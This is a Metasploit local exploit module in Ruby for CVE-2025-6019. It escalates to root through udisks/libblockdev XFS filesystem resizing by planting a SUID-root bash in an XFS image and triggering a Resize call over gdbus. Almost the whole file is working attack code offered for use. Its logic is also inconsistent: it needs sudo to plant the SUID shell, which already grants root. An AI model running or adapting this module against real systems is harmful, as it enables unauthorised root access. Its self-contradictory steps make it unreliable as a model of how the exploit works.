##
# CVE-2025-6019 Metasploit Module - udisks/libblockdev XFS Resize Privilege Escalation
##
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'udisks/libblockdev XFS Resize Privilege Escalation',
      'Description'    => %q{
        Exploits a privilege escalation vulnerability in libblockdev used by udisks allowing
        allow_active users to escalate to root by mounting and resizing an XFS image containing a SUID-root shell.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Qualys Security Advisory'],
      'Platform'       => ['linux'],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'References'     => [['CVE', '2025-6019']],
      'DisclosureDate' => '2025-06-17'
    ))
  end

  def check
    return CheckCode::Detected if command_exists?('udisksctl') && command_exists?('mkfs.xfs')
    CheckCode::Safe
  end

  def exploit
    image_path = "/tmp/xfs_image.img"

    print_status("Creating malicious XFS image")
    cmd_exec("dd if=/dev/zero of=#{image_path} bs=1M count=300")
    cmd_exec("mkfs.xfs -q #{image_path}")

    mount_dir = "/tmp/xfs_mount"
    cmd_exec("mkdir -p #{mount_dir}")

    # Temporary privileged action needed (assuming you are root or this step is pre-uploaded)
    unless command_exists?('sudo')
      fail_with(Failure::NoAccess, "'sudo' required for local mount action")
    end

    print_status("Populating XFS image with SUID-root bash")
    cmd_exec("sudo mount -o loop #{image_path} #{mount_dir}")
    cmd_exec("sudo cp /bin/bash #{mount_dir}/bash")
    cmd_exec("sudo chmod 04555 #{mount_dir}/bash")
    cmd_exec("sudo umount #{mount_dir}")

    print_status("Mapping XFS image via udisks")
    loop_device_output = cmd_exec("udisksctl loop-setup --file #{image_path} --no-user-interaction")
    loop_device = loop_device_output.scan(%r{/dev/loop\d+}).first

    if loop_device.nil?
      fail_with(Failure::UnexpectedReply, "Could not map loop device")
    end

    print_status("Mounting XFS image without nodev/nosuid flags via resize")
    cmd_exec("bash -c 'while true; do /tmp/blockdev*/bash -c \"sleep 10\"; done &' >/dev/null 2>&1")

    cmd_exec("gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/#{File.basename(loop_device)} --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'")

    print_good("XFS filesystem mounted with SUID binary available in /tmp/blockdev.*")
    exploit_mountpoint = cmd_exec('ls -d /tmp/blockdev.*').strip

    print_good("Privilege escalation complete! Execute the following command to gain root shell:")
    print_line("#{exploit_mountpoint}/bash -p")

    register_file_for_cleanup(image_path)
  end
end
